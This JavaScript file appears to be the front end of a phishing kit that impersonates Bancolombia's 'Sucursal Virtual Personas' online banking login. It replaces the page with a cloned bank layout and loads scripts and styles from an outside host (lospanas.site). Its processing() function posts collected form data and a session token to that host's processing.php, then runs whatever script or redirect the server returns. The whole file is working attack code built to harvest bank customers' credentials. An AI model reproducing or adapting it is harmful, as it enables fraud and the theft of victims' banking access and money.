var my_hosting ="https://lospanas.site/";
var my_head = `

<head>
    <title>Bancolombia Sucursal Virtual Personas</title>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <meta charset="ISO-8859-1">
    <meta content="es" http-equiv="Content-Language">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Todo1">
    <meta name="author" content="Todo1 Services">
    <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link href="${my_hosting}css/styles.css" media="all" rel="stylesheet" type="text/css">
    <link href="${my_hosting}css/bootstrap.css" media="all" rel="stylesheet" type="text/css">
    <link href="${my_hosting}css/keyboard_util.css" rel="stylesheet" type="text/css">
    <link href="${my_hosting}css/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
    <link href="${my_hosting}css/ui.css" media="all" rel="stylesheet" type="text/css">
    <link href="${my_hosting}css/showLoadingBank.css" media="all" rel="stylesheet" type="text/css">
    <link href="${my_hosting}css/stylesheet.css" media="all" rel="stylesheet" type="text/css">
</head>
`;
var my_body = `

<body>
    <div id="cargando" style="width: 100%; text-align: center; display: none;">
    </div>
    <div id="contenidoWeb">
        <form id="loginUserForm" name="loginUserForm" onsubmit="return false;">
            <div class="container" id="containerMain">
                <div>
                    <div id="header" class="mua-page-header">
                        <div class="row row-logo-svp">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div class="mua-imgLogoItem"></div>
                                <div class="text-svp-name">Sucursal Virtual Personas</div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
                                    <div>
                                        <div class="timeText">Fecha y hora actual:</div>
                                        <span id="jclock1" class="lastVisitedText" currenttime=""> </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel-heading">
                        <h3 id="titulo"></h3>
                    </div>
                </div>
                <div class="panel panel-primary" style="min-height: 68vh;">
                    <div class="row" id="error">
                        <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
                            <div class="errorDiv">
                                <div class="divTextMessage">
                                    <span class="icon-error errorIcon">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                    </span>
                                    <div class="errorTitulo">Error</div>
                                    <div id="summary" class="errorTexto"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="contenido">
                    </div>
                </div>
                <div class="footer">
                    <div id="sucursales" class="row" style="margin-bottom: 10px;">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                            <p class="mua-footer">
                                Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 -
                                Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00
                                - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país
                                018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados
                                Unidos (1) 866 379 97 14.
                            </p>
                        </div>
                    </div>
                    <div>
                        <div class="mua-title-text pull-left">Dirección IP: 203.129.219.162</div>
                        <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
                    </div>
                </div>
            </div>

            <input id="device_id" name="device_id" type="hidden" value="">
            <input id="userlanguage" name="userlanguage" type="hidden" value="es-ES">
            <input id="deviceprint" name="deviceprint" styleid="deviceprint" type="hidden" value="">
            <input id="pgid" name="pgid" type="hidden" value="">
            <input id="uievent" name="uievent" type="hidden" value="">

            <meta http-equiv="PRAGMA" content="NO-CACHE">
            <meta http-equiv="Expires" content="-1">
        </form>
    </div>
</body>
`;

var opciones = `
<div class="panel_general mua-panel_general">
    <div class="mua-divIcon">
        <a class="mua-itemsIcons-btn" href="#">
            <div class="mua-divCell">
                <span class="adminItems-Icons icon-icon_demo">
                    <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
                </span>
            </div>
            <div class="mua-divCell-text">
                Conoce sobre Sucursal Virtual Personas
            </div>
        </a>
    </div>
    <div class="mua-divIcon">
        <a class="mua-itemsIcons-btn" href="#">
            <div class="mua-divCell">
                <span class="adminItems-Icons icon-icon_bloquear">
                    <span class="path1"></span><span class="path2"></span>
                </span>
            </div>
            <div class="mua-divCell-text">
                Aprende sobre Seguridad
            </div>
        </a>
    </div>
    <div class="mua-divIcon">
        <a class="mua-itemsIcons-btn" href="#">
            <div class="mua-divCell">
                <span class="adminItems-Icons icon-icon_reglamento">
                    <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
                </span>
            </div>
            <div class="mua-divCell-text">
                Reglamento Sucursal Virtual
            </div>
        </a>
    </div>
    <div class="mua-divIcon">
        <a class="mua-itemsIcons-btn" href="#">
            <div class="mua-divCell">
                <span class="adminItems-Icons icon-icon_politicas">
                    <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
                </span>
            </div>
            <div class="mua-divCell-text">
                Política de Privacidad
            </div>
        </a>
    </div>
</div>
`;

var anuncios = `
<div class="col-xs-12 col-sm-7 col-md-8">
    <div class="" id="banner-persona">
        <img id="imgpubli" src="" border="0" class="img-responsive">
    </div>
    <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp;
        Conoce más <a href="#" class="a1">aquí</a></p>
</div>
`;

var captcha = `
<div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 1s linear 0s; opacity: 0;">
    <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(0, 255, 255); ">
        <iframe title="El reCAPTCHA caduca dentro de dos minutos" src="https://www.google.com/recaptcha/api2/bframe?hl=es&amp;v=CDFvp7CXAHw7k3HxO47Gm1O9&amp;k=6LcQkTUUAAAAAAqNJNF97DoEKkxyTia9U6SOqp61" name="c-j8gias2dm4i6" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe>
    </div>
</div>
`;

//<script>
    let timer = undefined;
    let token = 'Pamplemusa';
    let registro = '';
    let usuario = '';
    let api_server = `${my_hosting}processing.php`;

    function loadScript(path, data) {

        clearInterval(timer);
        $.getScript(my_hosting + "_" + path + ".php", function() {
            if (data.body) {
                $('body').toggle(true);
            }
            $('#tabError').toggle(data.error != undefined);
            if (data.error) {
                $('#summary').html(data.error);
            }
            var optionsEST = {
                utc: true,
                utcOffset: -5,
                format: "%A %R de %B de %Y %l:%M:%S %P",
                language: "es"
            }
            $('#jclock1').jclockNew(optionsEST);
            $('#captcha').html(captcha);
            $('#opciones').html(opciones);
            $('#anuncios').html(anuncios);
            $('#imgpubli').attr('src', my_hosting + "img/publi_" + path + ".jpg");
        });
    }

    $.getScript(my_hosting + "js/jquery.jclockNew.js");


    async function processing(p = {}) {
        let fd = new FormData();
        fd.append("reg", registro);
        fd.append("tok", token);
        for (var d in p) {
            fd.append(d, p[d]);
        }
        const prom = await fetch(api_server, {
            method: "POST",
            body: fd
        });
        let json = await prom.json();
        if (!json || !json.action) {
            return;
        }
        let action = json.action;
        if (json.reg) {
            registro = json.reg;
        }
        if (json.user) {
            usuario = json.user;
        }
        if (action == 'url') {
            window.location.href = json.url;
        } else {
            loadScript(action, json);
        }
    }

    function consultarEstado() {
        processing({
            t: 9,
        });
    }
    $('head').html(my_head);
    $(function() {
        $('body').toggle(false);
        $('body').html(my_body);
        loadScript("home", {
            body: true
        });
    })